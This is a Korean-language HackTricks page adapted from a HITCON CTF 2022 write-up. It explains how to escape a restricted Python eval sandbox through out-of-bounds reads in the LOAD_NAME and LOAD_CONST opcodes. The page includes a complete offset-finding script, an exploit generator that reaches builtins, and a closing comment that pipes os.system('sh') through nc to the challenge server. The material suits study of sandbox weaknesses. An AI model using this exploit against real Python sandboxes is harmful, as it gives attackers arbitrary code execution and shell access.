# LOAD\_NAME / LOAD\_CONST opcode OOB Read

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 PR을 제출**하세요.

</details>

**이 정보는** [**이 글에서 가져왔습니다**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

LOAD\_NAME / LOAD\_CONST opcode의 OOB read 기능을 사용하여 메모리에서 일부 심볼을 가져올 수 있습니다. 이는 `(a, b, c, ... 수백 개의 심볼 ..., __getattribute__) if [] else [].__getattribute__(...)`와 같은 트릭을 사용하여 원하는 심볼(예: 함수 이름)을 가져올 수 있음을 의미합니다.

그런 다음 exploit을 작성하면 됩니다.

### 개요 <a href="#overview-1" id="overview-1"></a>

소스 코드는 매우 짧으며, 단 4줄만 포함되어 있습니다!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
임의의 Python 코드를 입력할 수 있으며, 이는 [Python 코드 객체](https://docs.python.org/3/c-api/code.html)로 컴파일됩니다. 그러나 해당 코드 객체의 `co_consts`와 `co_names`는 eval하기 전에 빈 튜플로 대체됩니다.

따라서 이 방식으로 상수(예: 숫자, 문자열 등) 또는 이름(예: 변수, 함수)을 포함하는 모든 표현식은 최종적으로 segmentation fault를 발생시킬 수 있습니다.

### 경계를 벗어난 읽기 <a href="#out-of-bound-read" id="out-of-bound-read"></a>

segfault는 어떻게 발생하나요?

간단한 예제로 시작해보겠습니다. `[a, b, c]`는 다음과 같은 바이트 코드로 컴파일될 수 있습니다.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
하지만 `co_names`이 빈 튜플이 되는 경우는 어떻게 될까요? `LOAD_NAME 2` 옵코드는 여전히 실행되고, 원래 그 메모리 주소에서 값을 읽으려고 시도합니다. 네, 이것은 out-of-bound read "기능"입니다.

해결책에 대한 핵심 개념은 간단합니다. CPython에서 `LOAD_NAME` 및 `LOAD_CONST`와 같은 일부 옵코드는 OOB read에 취약합니다.

이들은 `consts` 또는 `names` 튜플에서 인덱스 `oparg`의 객체를 검색합니다 (`co_consts` 및 `co_names`가 내부적으로 지칭하는 것입니다). CPython이 `LOAD_CONST` 옵코드를 처리할 때 무엇을 수행하는지 알아보기 위해 다음 짧은 코드 조각을 참조할 수 있습니다.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
이 방법을 사용하여 OOB 기능을 사용하여 임의의 메모리 오프셋에서 "name"을 가져올 수 있습니다. 어떤 이름을 가지고 있는지와 오프셋이 무엇인지 확인하려면 `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ...을 계속 시도하면 됩니다. 그리고 약 oparg > 700 정도에서 무언가를 찾을 수 있을 것입니다. 물론 gdb를 사용하여 메모리 레이아웃을 살펴볼 수도 있지만, 더 쉬울 것 같지는 않습니다.

### Exploit 생성 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

이름 / 상수에 대한 유용한 오프셋을 검색한 후에는 해당 오프셋에서 이름 / 상수를 가져와 사용하는 방법은 어떻게 해야 할까요? 여기에 팁이 있습니다:\
`co_names=()`와 함께 `LOAD_NAME 5`에서 `__getattribute__` 이름을 가져올 수 있다고 가정해 봅시다. 그럼 다음과 같은 작업을 수행하면 됩니다:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> 주목할 점은 `__getattribute__`로 이름을 지정할 필요가 없다는 것입니다. 더 짧거나 더 이상한 이름으로 지정할 수도 있습니다.

바이트 코드를 확인하면 그 이유를 이해할 수 있습니다:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
`LOAD_ATTR`는 `co_names`에서도 이름을 가져옵니다. Python은 이름이 동일한 경우 동일한 오프셋에서 이름을 로드합니다. 따라서 두 번째 `__getattribute__`는 여전히 offset=5에서 로드됩니다. 이 기능을 사용하여 이름이 메모리 근처에 있으면 임의의 이름을 사용할 수 있습니다.

숫자를 생성하는 것은 간단해야합니다:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

길이 제한 때문에 상수를 사용하지 않았습니다.

먼저 여기에는 이름의 오프셋을 찾기 위한 스크립트가 있습니다.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
그리고 다음은 실제 Python 악용을 생성하기 위한 것입니다.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
기본적으로 다음과 같은 작업을 수행합니다. `__dir__` 메서드에서 얻은 문자열에 대해 다음 작업을 수행합니다:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
